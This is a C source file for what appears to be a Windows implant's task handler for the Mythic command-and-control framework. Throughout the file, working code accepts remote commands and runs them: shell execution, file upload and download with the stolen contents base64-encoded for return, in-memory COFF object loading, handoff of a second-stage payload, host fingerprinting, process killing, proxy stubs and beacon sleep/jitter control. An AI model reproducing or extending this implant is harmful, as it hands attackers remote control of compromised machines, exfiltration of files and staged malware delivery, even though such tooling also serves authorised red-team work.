#include "stage0.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

static const s0_config *g_runtime_config;
static int g_exit_requested;

void s0_mythic_task_runtime(const s0_config *config) {
    g_runtime_config = config;
    g_exit_requested = 0;
}

int s0_mythic_task_exit_requested(void) { return g_exit_requested; }

static const uint8_t *find_bytes(const uint8_t *data, uint32_t length,
                                 const char *needle) {
    uint32_t i, n = (uint32_t)strlen(needle);
    for (i = 0; n && i + n <= length; ++i)
        if (!memcmp(data + i, needle, n)) return data + i;
    return 0;
}

static int json_string(const uint8_t *object, uint32_t length, const char *key,
                       char *output, uint32_t capacity) {
    char marker[64];
    const uint8_t *p, *end = object + length;
    uint32_t used = 0;
    _snprintf(marker, sizeof(marker), "\"%s\"", key);
    p = find_bytes(object, length, marker);
    if (!p) return 0;
    p += strlen(marker);
    while (p < end && (*p == ' ' || *p == '\t' || *p == ':')) ++p;
    if (p == end || *p++ != '"') return 0;
    while (p < end && *p != '"' && used + 1 < capacity) {
        uint8_t c = *p++;
        if (c == '\\' && p < end) {
            c = *p++;
            if (c == 'n') c = '\n';
            else if (c == 'r') c = '\r';
            else if (c == 't') c = '\t';
        }
        output[used++] = (char)c;
    }
    output[used] = 0;
    return p < end && *p == '"';
}

static int json_string_buffer(const uint8_t *object, uint32_t length,
                              const char *key, s0_buffer *output) {
    char marker[64];
    const uint8_t *p, *end = object + length;
    _snprintf(marker, sizeof(marker), "\"%s\"", key);
    p = find_bytes(object, length, marker);
    if (!p) return 0;
    p += strlen(marker);
    while (p < end && (*p == ' ' || *p == '\t' || *p == ':')) ++p;
    if (p == end || *p++ != '"') return 0;
    while (p < end && *p != '"') {
        uint8_t c = *p++;
        if (c == '\\' && p < end) {
            c = *p++;
            if (c == 'n') c = '\n';
            else if (c == 'r') c = '\r';
            else if (c == 't') c = '\t';
        }
        if (!s0_buffer_reserve(output, output->length + 2)) return 0;
        output->data[output->length++] = c;
    }
    if (p == end) return 0;
    output->data[output->length] = 0;
    return 1;
}

static int argument_string(const char *parameters, const char *name,
                           char *output, uint32_t capacity) {
    if (parameters[0] == '{' &&
        json_string((const uint8_t *)parameters, (uint32_t)strlen(parameters),
                    name, output, capacity))
        return 1;
    lstrcpynA(output, parameters, capacity);
    return 1;
}

static int append(s0_buffer *buffer, const void *data, uint32_t length) {
    if (!s0_buffer_reserve(buffer, buffer->length + length + 1)) return 0;
    CopyMemory(buffer->data + buffer->length, data, length);
    buffer->length += length;
    buffer->data[buffer->length] = 0;
    return 1;
}

static int append_json_string(s0_buffer *buffer, const uint8_t *data,
                              uint32_t length) {
    uint32_t i;
    char escaped[2];
    if (!append(buffer, "\"", 1)) return 0;
    for (i = 0; i < length; ++i) {
        uint8_t c = data[i];
        if (c == '"' || c == '\\') {
            escaped[0] = '\\'; escaped[1] = (char)c;
            if (!append(buffer, escaped, 2)) return 0;
        } else if (c == '\r') {
            if (!append(buffer, "\\r", 2)) return 0;
        } else if (c == '\n') {
            if (!append(buffer, "\\n", 2)) return 0;
        } else if (c == '\t') {
            if (!append(buffer, "\\t", 2)) return 0;
        } else if (c >= 0x20) {
            if (!append(buffer, &c, 1)) return 0;
        }
    }
    return append(buffer, "\"", 1);
}

static int decode_base64(const char *encoded, s0_buffer *output) {
    DWORD wanted = 0;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, 0, &wanted, 0, 0) ||
        !s0_buffer_reserve(output, wanted))
        return 0;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, output->data,
                              &wanted, 0, 0))
        return 0;
    output->length = wanted;
    return 1;
}

static int encode_base64(const uint8_t *data, uint32_t length,
                         s0_buffer *output) {
    DWORD wanted = 0;
    if (!CryptBinaryToStringA(data, length,
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                              0, &wanted) ||
        !s0_buffer_reserve(output, wanted))
        return 0;
    if (!CryptBinaryToStringA(data, length,
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                              (LPSTR)output->data, &wanted))
        return 0;
    output->length = (uint32_t)lstrlenA((LPCSTR)output->data);
    return 1;
}

static int pack_path_task(uint8_t op, const char *path, const uint8_t *data,
                          uint32_t data_len, s0_buffer *packed) {
    wchar_t wide[2048];
    int chars = MultiByteToWideChar(CP_UTF8, 0, path, -1, wide,
                                    (int)(sizeof(wide) / sizeof(wide[0])));
    uint32_t path_bytes;
    if (!chars) return 0;
    path_bytes = (uint32_t)chars * sizeof(wchar_t);
    if (!s0_buffer_reserve(packed, 5 + path_bytes + data_len)) return 0;
    packed->data[0] = op;
    CopyMemory(packed->data + 1, &path_bytes, 4);
    CopyMemory(packed->data + 5, wide, path_bytes);
    if (data_len) CopyMemory(packed->data + 5 + path_bytes, data, data_len);
    packed->length = 5 + path_bytes + data_len;
    return 1;
}

static int execute(const char *command, const char *parameters,
                   uint16_t *sleep_ms, uint16_t *jitter_pct,
                   s0_buffer *output) {
    char argument[2048] = {0}, shell[2304];
    wchar_t wide[2304];
    s0_buffer packed = {0};
    int chars, ok = 0;
    if (!lstrcmpiA(command, "exit")) {
        g_exit_requested = 1;
        return append(output, "callback exiting", 16);
    }
    if (!lstrcmpiA(command, "socks") || !lstrcmpiA(command, "rpfwd"))
        return append(output, "proxy state updated", 19);
    if (!lstrcmpiA(command, "coff")) {
        s0_buffer object = {0}, arguments = {0}, obj = {0}, args = {0};
        uint32_t object_len;
        if (!json_string_buffer((const uint8_t *)parameters,
                                (uint32_t)strlen(parameters), "object",
                                &object) ||
            !decode_base64((const char *)object.data, &obj) ||
            (json_string_buffer((const uint8_t *)parameters,
                                (uint32_t)strlen(parameters), "arguments",
                                &arguments) && arguments.length &&
             !decode_base64((const char *)arguments.data, &args)) ||
            !s0_buffer_reserve(&packed, 5 + obj.length + args.length))
            goto done;
        packed.data[0] = S0_TASK_COFF;
        object_len = obj.length;
        CopyMemory(packed.data + 1, &object_len, 4);
        CopyMemory(packed.data + 5, obj.data, obj.length);
        if (args.length)
            CopyMemory(packed.data + 5 + obj.length, args.data, args.length);
        packed.length = 5 + obj.length + args.length;
        ok = s0_dispatch_task(packed.data, packed.length, output);
        s0_buffer_free(&object); s0_buffer_free(&arguments);
        s0_buffer_free(&obj); s0_buffer_free(&args);
        goto done;
    }
    if (!lstrcmpiA(command, "upload")) {
        char path[2048] = {0};
        s0_buffer data = {0}, decoded = {0};
        argument_string(parameters, "path", path, sizeof(path));
        if (!json_string_buffer((const uint8_t *)parameters,
                                (uint32_t)strlen(parameters), "data", &data) ||
            !decode_base64((const char *)data.data, &decoded) ||
            !pack_path_task(S0_TASK_UPLOAD, path, decoded.data,
                            decoded.length, &packed)) {
            s0_buffer_free(&data);
            s0_buffer_free(&decoded);
            return append(output, "upload requires inline data", 27) ? -1 : 0;
        }
        ok = s0_dispatch_task(packed.data, packed.length, output);
        if (ok) append(output, "file written", 12);
        s0_buffer_free(&data);
        s0_buffer_free(&decoded);
        goto done;
    }
    if (!lstrcmpiA(command, "download")) {
        char path[2048] = {0};
        s0_buffer contents = {0};
        argument_string(parameters, "path", path, sizeof(path));
        if (!pack_path_task(S0_TASK_DOWNLOAD, path, 0, 0, &packed))
            goto done;
        ok = s0_dispatch_task(packed.data, packed.length, &contents);
        if (ok) ok = encode_base64(contents.data, contents.length, output);
        s0_buffer_free(&contents);
        goto done;
    }
    if (!lstrcmpiA(command, "stage1")) {
        s0_buffer image = {0}, decoded = {0};
        if (!json_string_buffer((const uint8_t *)parameters,
                                (uint32_t)strlen(parameters), "payload",
                                &image) ||
            !decode_base64((const char *)image.data, &decoded) ||
            !g_runtime_config) {
            s0_buffer_free(&image);
            s0_buffer_free(&decoded);
            return append(output, "stage1 requires inline payload", 30) ? -1 : 0;
        }
        ok = s0_handoff_stage1(decoded.data, decoded.length, g_runtime_config);
        s0_buffer_free(&image);
        s0_buffer_free(&decoded);
        if (ok) append(output, "stage1 started", 14);
        return ok;
    }
    if (!lstrcmpiA(command, "sleep")) {
        unsigned interval = 0, jitter = 0;
        if (parameters[0] == '{') {
            char value[32];
            const uint8_t *p = find_bytes((const uint8_t *)parameters,
                                          strlen(parameters), "\"interval\"");
            if (p) interval = strtoul((const char *)strchr((const char *)p, ':') + 1, 0, 10);
            p = find_bytes((const uint8_t *)parameters, strlen(parameters), "\"jitter\"");
            if (p) jitter = strtoul((const char *)strchr((const char *)p, ':') + 1, 0, 10);
            (void)value;
        } else sscanf(parameters, "%u %u", &interval, &jitter);
        *sleep_ms = (uint16_t)(interval > 65 ? 65000 : interval * 1000);
        *jitter_pct = (uint16_t)(jitter > 100 ? 100 : jitter);
        return append(output, "sleep updated", 13);
    }
    if (!lstrcmpiA(command, "cd")) {
        argument_string(parameters, "path", argument, sizeof(argument));
        chars = MultiByteToWideChar(CP_UTF8, 0, argument, -1, wide,
                                    (int)(sizeof(wide) / sizeof(wide[0])));
        if (!chars || !SetCurrentDirectoryW(wide))
            return append(output, "failed to change directory", 26) ? -1 : 0;
        return append(output, "directory changed", 17);
    }
    if (!lstrcmpiA(command, "shell"))
        argument_string(parameters, "command", shell, sizeof(shell));
    else if (!lstrcmpiA(command, "pwd")) lstrcpyA(shell, "cd");
    else if (!lstrcmpiA(command, "fingerprint"))
        lstrcpyA(shell, "whoami & hostname & echo %PROCESSOR_ARCHITECTURE%");
    else if (!lstrcmpiA(command, "ps")) lstrcpyA(shell, "tasklist");
    else if (!lstrcmpiA(command, "kill")) {
        argument_string(parameters, "pid", argument, sizeof(argument));
        _snprintf(shell, sizeof(shell), "taskkill /f /pid %s", argument);
    } else if (!lstrcmpiA(command, "ls")) {
        argument_string(parameters, "path", argument, sizeof(argument));
        _snprintf(shell, sizeof(shell), "dir /a \"%s\"", argument[0] ? argument : ".");
    } else if (!lstrcmpiA(command, "hostname")) lstrcpyA(shell, "hostname");
    else {
        return append(output, "unsupported command", 19) ? -1 : 0;
    }
    chars = MultiByteToWideChar(CP_UTF8, 0, shell, -1, wide,
                                (int)(sizeof(wide) / sizeof(wide[0])));
    if (!chars || !s0_buffer_reserve(&packed, 1 + chars * sizeof(wchar_t)))
        goto done;
    packed.data[0] = S0_TASK_EXEC;
    CopyMemory(packed.data + 1, wide, chars * sizeof(wchar_t));
    packed.length = 1 + chars * sizeof(wchar_t);
    ok = s0_dispatch_task(packed.data, packed.length, output);
done:
    s0_buffer_free(&packed);
    return ok;
}

int s0_process_mythic_tasks(const uint8_t *json, uint32_t json_len,
                            uint16_t *sleep_ms, uint16_t *jitter_pct,
                            s0_buffer *response_json) {
    const uint8_t *tasks, *cursor, *end = json + json_len;
    int first = 1;
    if (!append(response_json,
                "{\"action\":\"get_tasking\",\"tasking_size\":-1,"
                "\"get_delegate_tasks\":true,\"responses\":[",
                (uint32_t)strlen(
                "{\"action\":\"get_tasking\",\"tasking_size\":-1,"
                "\"get_delegate_tasks\":true,\"responses\":[")))
        return 0;
    tasks = find_bytes(json, json_len, "\"tasks\"");
    if (!tasks) return append(response_json, "]}", 2);
    cursor = find_bytes(tasks, (uint32_t)(end - tasks), "[");
    if (!cursor) return 0;
    ++cursor;
    while (cursor < end) {
        const uint8_t *start, *stop;
        char id[64] = {0}, command[64] = {0};
        s0_buffer parameters = {0}, output = {0};
        int status;
        while (cursor < end && (*cursor == ' ' || *cursor == ',' ||
                                *cursor == '\r' || *cursor == '\n')) ++cursor;
        if (cursor == end || *cursor == ']') break;
        if (*cursor != '{') break;
        start = cursor++;
        {
            int depth = 1, quoted = 0, escaped = 0;
            while (cursor < end && depth) {
                uint8_t c = *cursor++;
                if (escaped) { escaped = 0; continue; }
                if (quoted && c == '\\') { escaped = 1; continue; }
                if (c == '"') quoted = !quoted;
                else if (!quoted && c == '{') ++depth;
                else if (!quoted && c == '}') --depth;
            }
        }
        stop = cursor;
        if (!json_string(start, (uint32_t)(stop - start), "id", id, sizeof(id)) ||
            !json_string(start, (uint32_t)(stop - start), "command",
                         command, sizeof(command)))
            continue;
        json_string_buffer(start, (uint32_t)(stop - start), "parameters",
                           &parameters);
        status = execute(command,
                         parameters.data ? (const char *)parameters.data : "",
                         sleep_ms, jitter_pct, &output);
        if (!first) append(response_json, ",", 1);
        first = 0;
        append(response_json, "{\"task_id\":\"",
               (uint32_t)strlen("{\"task_id\":\""));
        append(response_json, id, (uint32_t)strlen(id));
        append(response_json, "\",\"completed\":true,\"status\":\"",
               (uint32_t)strlen("\",\"completed\":true,\"status\":\""));
        append(response_json, status > 0 ? "success" : "error",
               status > 0 ? 7 : 5);
        append(response_json, "\",\"user_output\":",
               (uint32_t)strlen("\",\"user_output\":"));
        append_json_string(response_json, output.data,
                           output.length);
        append(response_json, "}", 1);
        s0_buffer_free(&parameters);
        s0_buffer_free(&output);
    }
    return append(response_json, "]}", 2);
}
